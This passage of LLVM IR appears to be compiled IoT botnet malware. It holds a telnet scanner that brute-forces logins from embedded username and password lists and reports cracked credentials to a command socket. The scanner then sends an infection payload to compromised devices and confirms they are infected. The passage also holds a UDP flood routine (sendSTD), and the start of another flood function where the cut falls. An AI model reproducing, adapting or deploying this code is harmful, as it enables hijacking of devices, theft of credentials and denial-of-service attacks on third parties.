  %25 = bitcast %struct.telstate_t* %24 to i8*
  %26 = sext i32 %1 to i64
  %27 = mul nsw i64 %26, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %25, i8 0, i64 %27, i32 16, i1 false)
  %28 = icmp sgt i32 %1, 0
  br i1 %28, label %.lr.ph119.preheader, label %.preheader

.lr.ph119.preheader:                              ; preds = %11
  %wide.trip.count = zext i32 %1 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph119.prol.loopexit, label %.lr.ph119.prol.preheader

.lr.ph119.prol.preheader:                         ; preds = %.lr.ph119.preheader
  br label %.lr.ph119.prol

.lr.ph119.prol:                                   ; preds = %.lr.ph119.prol.preheader
  %29 = bitcast %struct.telstate_t* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 32, i32 16, i1 false)
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 0, i32 3
  store i8 1, i8* %30, align 1
  %31 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 0, i32 9
  store i8* %22, i8** %31, align 8
  br label %.lr.ph119.prol.loopexit

.lr.ph119.prol.loopexit:                          ; preds = %.lr.ph119.preheader, %.lr.ph119.prol
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph119.preheader ], [ 1, %.lr.ph119.prol ]
  %32 = icmp eq i32 %1, 1
  br i1 %32, label %.preheader.loopexit, label %.lr.ph119.preheader.new

.lr.ph119.preheader.new:                          ; preds = %.lr.ph119.prol.loopexit
  br label %.lr.ph119

.preheader.loopexit.unr-lcssa:                    ; preds = %.lr.ph119
  br label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %.lr.ph119.prol.loopexit, %.preheader.loopexit.unr-lcssa
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %11
  %33 = icmp sgt i32 %1, 0
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  br label %.loopexit

.lr.ph119:                                        ; preds = %.lr.ph119, %.lr.ph119.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph119.preheader.new ], [ %indvars.iv.next.1, %.lr.ph119 ]
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %indvars.iv
  %38 = bitcast %struct.telstate_t* %37 to i8*
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 32, i32 16, i1 false)
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %indvars.iv, i32 3
  store i8 1, i8* %39, align 1
  %40 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %indvars.iv, i32 9
  store i8* %22, i8** %40, align 8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %indvars.iv.next
  %42 = bitcast %struct.telstate_t* %41 to i8*
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 32, i32 16, i1 false)
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %indvars.iv.next, i32 3
  store i8 1, i8* %43, align 1
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %indvars.iv.next, i32 9
  store i8* %22, i8** %44, align 8
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %.preheader.loopexit.unr-lcssa, label %.lr.ph119

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %46 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 0
  %47 = sext i32 %0 to i64
  %48 = bitcast i32* %6 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %351
  %.1117 = phi i32 [ %.mux, %351 ], [ 0, %.lr.ph.preheader ]
  %49 = sext i32 %.1117 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 7
  %52 = load i32, i32* %51, align 16
  %53 = icmp eq i32 %52, 0
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %.lr.ph
  %55 = call i64 @time(i64* null) #3
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %51, align 16
  br label %57

; <label>:57:                                     ; preds = %54, %.lr.ph
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 2
  %59 = load i8, i8* %58, align 8
  switch i8 %59, label %351 [
    i8 0, label %60
    i8 1, label %101
    i8 2, label %135
    i8 3, label %155
    i8 4, label %173
    i8 5, label %193
    i8 6, label %211
    i8 7, label %255
  ]

; <label>:60:                                     ; preds = %57
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  %62 = load i8, i8* %61, align 1
  switch i8 %62, label %82 [
    i8 1, label %63
    i8 0, label %70
  ]

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 9
  %65 = bitcast i8** %64 to i64*
  %66 = load i64, i64* %65, align 8
  %67 = bitcast %struct.telstate_t* %50 to i8*
  call void @llvm.memset.p0i8.i64(i8* %67, i8 0, i64 32, i32 16, i1 false)
  store i64 %66, i64* %65, align 8
  %68 = call i32 @getDatIP()
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 1
  store i32 %68, i32* %69, align 4
  br label %82

; <label>:70:                                     ; preds = %60
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 5
  %72 = load i8, i8* %71, align 1
  %73 = add i8 %72, 1
  store i8 %73, i8* %71, align 1
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 4
  %75 = load i8, i8* %74, align 2
  %76 = add i8 %75, 1
  store i8 %76, i8* %74, align 2
  %77 = icmp eq i8 %73, 98
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %70
  store i8 1, i8* %61, align 1
  br label %351

; <label>:79:                                     ; preds = %70
  %80 = icmp eq i8 %76, 99
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %79
  store i8 1, i8* %61, align 1
  br label %351

; <label>:82:                                     ; preds = %60, %79, %63
  store i16 2, i16* %17, align 4
  store i16 %18, i16* %19, align 2
  store i64 0, i64* %21, align 4
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 1
  %84 = load i32, i32* %83, align 4
  store i32 %84, i32* %45, align 4
  %85 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  store i32 %85, i32* %86, align 16
  %87 = icmp eq i32 %85, -1
  br i1 %87, label %351, label %88

; <label>:88:                                     ; preds = %82
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 3, i8* null) #3
  %90 = or i32 %89, 2048
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 4, i32 %90) #3
  %92 = load i32, i32* %86, align 16
  %93 = call i32 @connect(i32 %92, %struct.sockaddr* nonnull %34, i32 16) #3
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %100

; <label>:95:                                     ; preds = %88
  %96 = tail call i32* @__errno_location() #18
  %97 = load i32, i32* %96, align 4
  %98 = icmp eq i32 %97, 115
  br i1 %98, label %100, label %99

; <label>:99:                                     ; preds = %95
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:100:                                    ; preds = %95, %88
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 1)
  br label %351

; <label>:101:                                    ; preds = %57
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %46) #3, !srcloc !8
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %104 = load i32, i32* %103, align 16
  %105 = srem i32 %104, 64
  %106 = zext i32 %105 to i64
  %107 = shl i64 1, %106
  %108 = sdiv i32 %104, 64
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 %109
  %111 = load i64, i64* %110, align 8
  %112 = or i64 %107, %111
  store i64 %112, i64* %110, align 8
  store i64 0, i64* %35, align 8
  store i64 %47, i64* %36, align 8
  %113 = load i32, i32* %103, align 16
  %114 = add nsw i32 %113, 1
  %115 = call i32 @select(i32 %114, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* null, %struct.timeval* nonnull %4) #3
  switch i32 %115, label %128 [
    i32 1, label %116
    i32 -1, label %127
  ]

; <label>:116:                                    ; preds = %101
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %117 = load i32, i32* %103, align 16
  %118 = call i32 @getsockopt(i32 %117, i32 1, i32 4, i8* nonnull %48, i32* nonnull %5) #3
  %119 = load i32, i32* %6, align 4
  %120 = icmp eq i32 %119, 0
  br i1 %120, label %122, label %121

; <label>:121:                                    ; preds = %116
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:122:                                    ; preds = %116
  %123 = load i32, i32* %103, align 16
  %124 = call i32 (i32, i32, ...) @fcntl(i32 %123, i32 3, i8* null) #3
  %125 = and i32 %124, -2049
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %123, i32 4, i32 %125) #3
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 2)
  br label %351

; <label>:127:                                    ; preds = %101
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:128:                                    ; preds = %101
  %129 = load i32, i32* %51, align 16
  %130 = add i32 %129, 5
  %131 = zext i32 %130 to i64
  %132 = call i64 @time(i64* null) #3
  %133 = icmp slt i64 %131, %132
  br i1 %133, label %134, label %351

; <label>:134:                                    ; preds = %128
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:135:                                    ; preds = %57
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %137 = load i32, i32* %136, align 16
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 9
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @read_until_response(i32 %137, i32 %0, i8* %139, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i64 0, i64 0))
  %141 = icmp eq i32 %140, 0
  br i1 %141, label %148, label %142

; <label>:142:                                    ; preds = %135
  %143 = load i8*, i8** %138, align 8
  %144 = call i32 @contains_fail(i8* %143)
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %147, label %146

; <label>:146:                                    ; preds = %142
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %351

; <label>:147:                                    ; preds = %142
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 3)
  br label %351

; <label>:148:                                    ; preds = %135
  %149 = load i32, i32* %51, align 16
  %150 = add i32 %149, 7
  %151 = zext i32 %150 to i64
  %152 = call i64 @time(i64* null) #3
  %153 = icmp slt i64 %151, %152
  br i1 %153, label %154, label %351

; <label>:154:                                    ; preds = %148
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:155:                                    ; preds = %57
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %157 = load i32, i32* %156, align 16
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 4
  %159 = load i8, i8* %158, align 2
  %160 = zext i8 %159 to i64
  %161 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %160
  %162 = load i8*, i8** %161, align 8
  %163 = call i64 @strlen(i8* %162) #15
  %164 = call i64 @send(i32 %157, i8* %162, i64 %163, i32 16384) #3
  %165 = icmp slt i64 %164, 0
  br i1 %165, label %166, label %167

; <label>:166:                                    ; preds = %155
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:167:                                    ; preds = %155
  %168 = load i32, i32* %156, align 16
  %169 = call i64 @send(i32 %168, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i64 0, i64 0), i64 2, i32 16384) #3
  %170 = icmp slt i64 %169, 0
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %167
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:172:                                    ; preds = %167
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 4)
  br label %351

; <label>:173:                                    ; preds = %57
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %175 = load i32, i32* %174, align 16
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 9
  %177 = load i8*, i8** %176, align 8
  %178 = call i32 @read_until_response(i32 %175, i32 %0, i8* %177, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i64 0, i64 0))
  %179 = icmp eq i32 %178, 0
  br i1 %179, label %186, label %180

; <label>:180:                                    ; preds = %173
  %181 = load i8*, i8** %176, align 8
  %182 = call i32 @contains_fail(i8* %181)
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %185, label %184

; <label>:184:                                    ; preds = %180
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %351

; <label>:185:                                    ; preds = %180
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 5)
  br label %351

; <label>:186:                                    ; preds = %173
  %187 = load i32, i32* %51, align 16
  %188 = add i32 %187, 3
  %189 = zext i32 %188 to i64
  %190 = call i64 @time(i64* null) #3
  %191 = icmp slt i64 %189, %190
  br i1 %191, label %192, label %351

; <label>:192:                                    ; preds = %186
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:193:                                    ; preds = %57
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %195 = load i32, i32* %194, align 16
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 5
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i64
  %199 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = call i64 @strlen(i8* %200) #15
  %202 = call i64 @send(i32 %195, i8* %200, i64 %201, i32 16384) #3
  %203 = icmp slt i64 %202, 0
  br i1 %203, label %204, label %205

; <label>:204:                                    ; preds = %193
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:205:                                    ; preds = %193
  %206 = load i32, i32* %194, align 16
  %207 = call i64 @send(i32 %206, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i64 0, i64 0), i64 2, i32 16384) #3
  %208 = icmp slt i64 %207, 0
  br i1 %208, label %209, label %210

; <label>:209:                                    ; preds = %205
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:210:                                    ; preds = %205
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 6)
  br label %351

; <label>:211:                                    ; preds = %57
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 9
  %215 = load i8*, i8** %214, align 8
  %216 = call i32 @read_until_response(i32 %213, i32 %0, i8* %215, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %217 = icmp eq i32 %216, 0
  br i1 %217, label %248, label %218

; <label>:218:                                    ; preds = %211
  %219 = call i64 @time(i64* null) #3
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %51, align 16
  %221 = load i8*, i8** %214, align 8
  %222 = call i32 @contains_fail(i8* %221)
  %223 = icmp eq i32 %222, 0
  br i1 %223, label %225, label %224

; <label>:224:                                    ; preds = %218
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %351

; <label>:225:                                    ; preds = %218
  %226 = call i32 @contains_success(i8* %221)
  %227 = icmp eq i32 %226, 0
  br i1 %227, label %247, label %228

; <label>:228:                                    ; preds = %225
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  %230 = load i8, i8* %229, align 1
  %231 = icmp eq i8 %230, 2
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %228
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 7)
  br label %351

; <label>:233:                                    ; preds = %228
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 4
  %237 = load i8, i8* %236, align 2
  %238 = zext i8 %237 to i64
  %239 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %238
  %240 = load i8*, i8** %239, align 8
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 5
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i64
  %244 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %243
  %245 = load i8*, i8** %244, align 8
  %246 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.315, i64 0, i64 0), i8* %235, i8* %240, i8* %245)
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 7)
  br label %351

; <label>:247:                                    ; preds = %225
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:248:                                    ; preds = %211
  %249 = load i32, i32* %51, align 16
  %250 = add i32 %249, 7
  %251 = zext i32 %250 to i64
  %252 = call i64 @time(i64* null) #3
  %253 = icmp slt i64 %251, %252
  br i1 %253, label %254, label %351

; <label>:254:                                    ; preds = %248
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:255:                                    ; preds = %57
  %256 = call i64 @time(i64* null) #3
  %257 = trunc i64 %256 to i32
  store i32 %257, i32* %51, align 16
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %259 = load i32, i32* %258, align 16
  %260 = call i64 @send(i32 %259, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.316, i64 0, i64 0), i64 8, i32 16384) #3
  %261 = icmp slt i64 %260, 0
  %262 = load i32, i32* %258, align 16
  br i1 %261, label %263, label %266

; <label>:263:                                    ; preds = %255
  %264 = call i32 @sclose(i32 %262)
  store i8 0, i8* %58, align 8
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  store i8 1, i8* %265, align 1
  br label %351

; <label>:266:                                    ; preds = %255
  %267 = call i64 @send(i32 %262, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i64 0, i64 0), i64 8, i32 16384) #3
  %268 = icmp slt i64 %267, 0
  %269 = load i32, i32* %258, align 16
  br i1 %268, label %270, label %273

; <label>:270:                                    ; preds = %266
  %271 = call i32 @sclose(i32 %269)
  store i8 0, i8* %58, align 8
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  store i8 1, i8* %272, align 1
  br label %351

; <label>:273:                                    ; preds = %266
  %274 = call i64 @send(i32 %269, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.318, i64 0, i64 0), i64 7, i32 16384) #3
  %275 = icmp slt i64 %274, 0
  %276 = load i32, i32* %258, align 16
  br i1 %275, label %277, label %280

; <label>:277:                                    ; preds = %273
  %278 = call i32 @sclose(i32 %276)
  store i8 0, i8* %58, align 8
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  store i8 1, i8* %279, align 1
  br label %351

; <label>:280:                                    ; preds = %273
  %281 = call i64 @send(i32 %276, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.319, i64 0, i64 0), i64 4, i32 16384) #3
  %282 = icmp slt i64 %281, 0
  %283 = load i32, i32* %258, align 16
  br i1 %282, label %284, label %287

; <label>:284:                                    ; preds = %280
  %285 = call i32 @sclose(i32 %283)
  store i8 0, i8* %58, align 8
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  store i8 1, i8* %286, align 1
  br label %351

; <label>:287:                                    ; preds = %280
  %288 = call i64 @send(i32 %283, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.320, i64 0, i64 0), i64 26, i32 16384) #3
  %289 = icmp slt i64 %288, 0
  %290 = load i32, i32* %258, align 16
  br i1 %289, label %291, label %294

; <label>:291:                                    ; preds = %287
  %292 = call i32 @sclose(i32 %290)
  store i8 0, i8* %58, align 8
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  store i8 1, i8* %293, align 1
  br label %351

; <label>:294:                                    ; preds = %287
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 9
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @read_until_response(i32 %290, i32 %0, i8* %296, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @legit, i64 0, i64 0))
  %298 = icmp eq i32 %297, 0
  br i1 %298, label %351, label %299

; <label>:299:                                    ; preds = %294
  %300 = load i32, i32* %258, align 16
  %301 = load i8*, i8** @rekdevice, align 8
  %302 = call i64 @strlen(i8* %301) #15
  %303 = call i64 @send(i32 %300, i8* %301, i64 %302, i32 16384) #3
  %304 = icmp sgt i64 %303, 0
  br i1 %304, label %305, label %306

; <label>:305:                                    ; preds = %299
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %306

; <label>:306:                                    ; preds = %305, %299
  %307 = call i32 @sleep(i32 20) #3
  %308 = load i32, i32* %258, align 16
  %309 = load i8*, i8** %295, align 8
  %310 = call i32 @read_until_response(i32 %308, i32 %0, i8* %309, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @infected, i64 0, i64 0))
  %311 = icmp eq i32 %310, 0
  br i1 %311, label %326, label %312

; <label>:312:                                    ; preds = %306
  %313 = load i32, i32* @mainCommSock, align 4
  %314 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 4
  %316 = load i8, i8* %315, align 2
  %317 = zext i8 %316 to i64
  %318 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %317
  %319 = load i8*, i8** %318, align 8
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 5
  %321 = load i8, i8* %320, align 1
  %322 = zext i8 %321 to i64
  %323 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %322
  %324 = load i8*, i8** %323, align 8
  %325 = call i32 (i32, i8*, ...) @sockprintf(i32 %313, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.321, i64 0, i64 0), i8* %314, i8* %319, i8* %324)
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:326:                                    ; preds = %306
  %327 = load i32, i32* %51, align 16
  %328 = add i32 %327, 60
  %329 = zext i32 %328 to i64
  %330 = call i64 @time(i64* null) #3
  %331 = icmp slt i64 %329, %330
  br i1 %331, label %332, label %351

; <label>:332:                                    ; preds = %326
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 3
  %334 = load i8, i8* %333, align 1
  %335 = icmp eq i8 %334, 3
  br i1 %335, label %350, label %336

; <label>:336:                                    ; preds = %332
  %337 = load i32, i32* @mainCommSock, align 4
  %338 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 4
  %340 = load i8, i8* %339, align 2
  %341 = zext i8 %340 to i64
  %342 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %341
  %343 = load i8*, i8** %342, align 8
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i64 %49, i32 5
  %345 = load i8, i8* %344, align 1
  %346 = zext i8 %345 to i64
  %347 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %346
  %348 = load i8*, i8** %347, align 8
  %349 = call i32 (i32, i8*, ...) @sockprintf(i32 %337, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.322, i64 0, i64 0), i8* %338, i8* %343, i8* %348)
  br label %350

; <label>:350:                                    ; preds = %332, %336
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %351

; <label>:351:                                    ; preds = %294, %57, %172, %210, %100, %99, %134, %128, %154, %148, %192, %186, %254, %248, %326, %350, %224, %232, %233, %247, %184, %185, %146, %147, %121, %122, %82, %312, %291, %284, %277, %270, %263, %209, %204, %171, %166, %127, %81, %78
  %352 = add nsw i32 %.1117, 1
  %353 = icmp slt i32 %352, %1
  %brmerge = or i1 %353, %33
  %.mux = select i1 %353, i32 %352, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %351
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #12 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca [12 x i8], align 1
  %6 = tail call i64 @time(i64* null) #3
  %7 = getelementptr inbounds [12 x i8], [12 x i8]* %5, i64 0, i64 0
  %8 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i64 0, i64 0), i32 %1) #3
  %9 = call i32 @strcmp(i8* nonnull %7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.324, i64 0, i64 0)) #15
  %10 = icmp eq i32 %9, 0
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = load i32, i32* @mainCommSock, align 4
  %13 = call i32 (i32, i8*, ...) @sockprintf(i32 %12, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.402, i64 0, i64 0), i8* %0, i8* nonnull %7)
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  %15 = sext i32 %2 to i64
  %16 = add nsw i64 %6, %15
  %17 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %18

; <label>:18:                                     ; preds = %42, %3
  %.0 = phi i32 [ undef, %3 ], [ %43, %42 ]
  br i1 %10, label %19, label %23

; <label>:19:                                     ; preds = %18
  %20 = call i32 @rand() #3
  %21 = srem i32 %20, 65535
  %22 = add nsw i32 %21, 1026
  br label %23

; <label>:23:                                     ; preds = %18, %19
  %.sink = phi i32 [ %22, %19 ], [ %1, %18 ]
  %24 = trunc i32 %.sink to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #18
  store i16 %25, i16* %14, align 2
  %26 = call i32 @socket(i32 2, i32 2, i32 17) #3
  %27 = icmp slt i32 %26, 0
  br i1 %27, label %37, label %28

; <label>:28:                                     ; preds = %23
  %29 = call i32 @rand() #3
  %30 = sext i32 %29 to i64
  %31 = urem i64 %30, 78
  %32 = getelementptr inbounds [78 x i8*], [78 x i8*]* @sendSTD.randstrings, i64 0, i64 %31
  %33 = load i8*, i8** %32, align 8
  %34 = call i64 @strlen(i8* %33) #15
  %35 = call i64 @sendto(i32 %26, i8* %33, i64 %34, i32 0, %struct.sockaddr* nonnull %17, i32 16) #3
  %36 = call i32 @close(i32 %26) #3
  br label %37

; <label>:37:                                     ; preds = %23, %28
  %38 = icmp sgt i32 %.0, 99
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = call i64 @time(i64* null) #3
  %41 = icmp slt i64 %40, %16
  br i1 %41, label %42, label %44

; <label>:42:                                     ; preds = %39, %37
  %.1 = phi i32 [ %.0, %37 ], [ 0, %39 ]
  %43 = add nsw i32 %.1, 1
  br label %18

; <label>:44:                                     ; preds = %39
  %45 = call i32 @close(i32 %26) #3
  call void @exit(i32 0) #17
  unreachable
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
